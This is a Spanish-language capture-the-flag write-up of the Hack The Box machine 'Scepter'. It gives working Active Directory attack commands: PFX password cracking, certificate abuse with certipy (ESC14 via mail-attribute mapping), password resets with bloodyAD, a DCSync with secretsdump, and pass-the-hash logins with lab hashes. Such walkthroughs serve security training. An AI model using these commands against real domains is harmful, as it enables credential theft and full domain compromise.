---
tags:
title: Scepter - Hard (HTB)
permalink: /Scepter-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash 
nmap -sCV -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,5985,5986,9389,47001,49664,49665,49666,49667,49673,49690,49691,49693,49694,49707,49722,49741,49773 10.10.11.65
```

![Pasted image 20250724032706](images/Pasted image 20250724032706.png)

`└─# pfx2john lewis.pfx > lewis_hash                                               `
`pfx2john clark.pfx > clark_hash`

`pfx2john scott.pfx  > scott_hash`

`john lewis_hash -w=/usr/share/wordlists/rockyou.txt`

Password : `newpassword`

![Pasted image 20250724035231](images/Pasted image 20250724035231.png)

Convertimos los pares de claver de `baker` a un certificado `.pfx`
```bash 
openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt 
```

Verificamos con `certipy` el certificado con el password `newpassword` que anteriormente habiamos crackeado 
```bash 
certipy-ad auth -pfx baker.pfx -password 'newpassword' -dc-ip '10.10.11.65'
```

`d.baker:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce`

Recolectamos informacion del dominio via `BloodHound`.
```bash 
bloodhound-python  -u d.baker --hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce' -d scepter.htb -ns 10.10.11.65 -c All
```


Vemos que el usuario `d.baker` tiene permisos `ForceChangePassword` sobre el usuario `a.carter`. 
```bash 
pth-net rpc password "a.carter" "newP@ssword2022" -U "scepter.htb"/"d.baker"%"aad3b435b51404eeaad3b435b51404ee":"18b5fb0d99e7a475316213c15b6f22ce" -S "10.10.11.65"
```

Si vemos bien, podemos notar que `a.carter` forma parte del grupo `IT-SUPPORTS` el cual tiene permisos `GenericAll` sobre el `OU` `Staff Access Certificate` el cual `d.baker` es parte de este `OU`. Entonces como estamos "encerrados" y al ver que como usuario `d.baker` formamos parte del `OU` podemos tratar de que con `a.carter` darnos permisos `GenericAll` a nuestro `OU` para despues con `certipy` ver si en este dominio hay plantillas o certificados vulnerables.

```bash 
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'newP@ssword2022' add genericAll 'OU=STAFF ACCESS CERTIFICATE,DC=scepter,DC=htb' 'a.carter'
```

Usamos `certipy` para ver certificados `AD CS` vulnerables.
```bash 
certipy-ad find -u d.baker -hashes '18b5fb0d99e7a475316213c15b6f22ce' -dc-host scepter.htb -target 10.10.11.65 -dc-ip 10.10.11.65 -vulnerable
```

```bash 
cat 20250724121927_Certipy.txt
```


![Pasted image 20250724042020](images/Pasted image 20250724042020.png)

Vemos que el dominio es vulnerable a `ESC9`,pero es un falso positivo ya que en este caso no funciona, asi que viendo las flags vemos que `SubjectAltRequireEmail` y `NoScurityExtension` para el template llamado `StaffAccessCertificate` donde si realizamos una busqueda vemsoa que esto apunta a un `ESC14` el cual nos permite hacer un mapeo del atributo `altSecurityIdentities`, para detectar el valor hacemos esto : 

```bash 
bloodyAD --host dc01.scepter.htb -d scepter.htb get object h.brown --attr altSecurityIdentities
```

`altSecurityIdentities: X509:<RFC822>h.brown@scepter.htb`

Si leemos por la vulnerabilidad `ESC14` vemos que haciendo uso de ese valor podemos asignarnos el atributo de `mail` del usuario victima que coincida con el valor que el mismo contiene, donde luego podemos solicitar un certificado como el usuario victima y asi ir pivotando de usuarios. 


Nos definimos un mail haciendo uso del atributo:
```bash 
bloodyAD --host dc01.scepter.htb -d scepter.htb set object d.baker mail -v h.brown@scepter.htb 
```

Procedemos a solicitar el certificado con el template `StaffAccessCertificate`.
```bash 
certipy-ad req -u d.baker@scepter -hashes 18b5fb0d99e7a475316213c15b6f22ce -target 'dc01.scepter.htb' -ca 'scepter-DC01-CA' -template 'StaffAccessCertificate'
```

```bash 
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```

```bash 
evil-winrm -i scepter.htb -u h.brown -H '4ecf5242092c6fb8c360a08069c75a0c'
```
Fallido: ya que vemos en la respuesta ya sea por `crackmapexec` un error de tipo `STATUS_ACCOUNT_RESTRICTION` y si vemos en `BloodHound` el usuario forma parte del grupo `Protected Users`. Para eso intentamos loguearnos por medio de la autenticacion por `Kerberos` y para eso tenemos que editar el `/etc/krb5.conf`

Nos creamos un archivo `krb5` con la configuracion de `Kerberos` el cual despues lo tenemos que copiar a la ruta del mismo "`/etc/krb5.conf`".

```bash 
netexec smb dc01.scepter.htb --generate-krb5-file scepter.htb.krb5.conf
```

```bash 
sudo cp scepter.htb.krb5.conf /etc/krb5.conf
```

Ahora si nos logueamos 
```bash 
evil-winrm -i dc01.scepter.htb -r scepter.htb
```
# Shell p.adams

Como vemos que el usuario `h.brown` forma parte del grupo `CMS` el cual es el que maneja los certificados podemos si el usuario restante (`p.adams`), corre con la misma suerte que el usuario `h.brown` 

Desde la shell que consigmos como el usuario `h.brown`podemos ver que tambien tiene el atributo de `AltSecurityIdentities` por ende podemos mapearlo como el nuestro usuario y cambiar al atributo de `mail` del user `d.baker`

Vemos que posee el atributo
```bash 
dsacls "CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb"
```

Nos seteamos como el usuario `d.baker` un nuevo `mail`.
```bash 
bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'newP@ssword2022' set object d.baker mail -v painzz@scepter.htb
```

Y ahora solicitamos un certificado.
```bash 
certipy-ad req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65
```

Nos autenticamos para solicitar un `TGT`, y su hash `NetNTLMv2`.
```bash 
certipy-ad auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username p.adams
```

`aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0`


# Shell as root 

Una vez obtenenemos la shell como el usuario `p.adams` como antes pudimos ver por `BloodHound` este user forma parte del grupo `Replication Operators` el cual tiene capacidad de realizar un ataque `DCSync` contra el usuario Administrador.

```bash 
impacket-secretsdump scepter.htb/p.adams@dc01.scepter.htb -hashes :1b925c524f447bb821a8789c4b118ce0 -no-pass
```

![Pasted image 20250724053811](images/Pasted image 20250724053811.png)

```bash 
impacket-getTGT 'scepter.htb/administrator:' -hashes ':a291ead3493f9773dc615e66c2ea21c4' -dc-ip 10.10.11.65
```

```bash 
export KRB5CCNAME=administrator.ccache
```

```bash 
evil-winrm -i scepter.htb -u administrator -H 'a291ead3493f9773dc615e66c2ea21c4'
```

```bash 
type ../Desktop/root.txt
```

`~Happy Hacking.`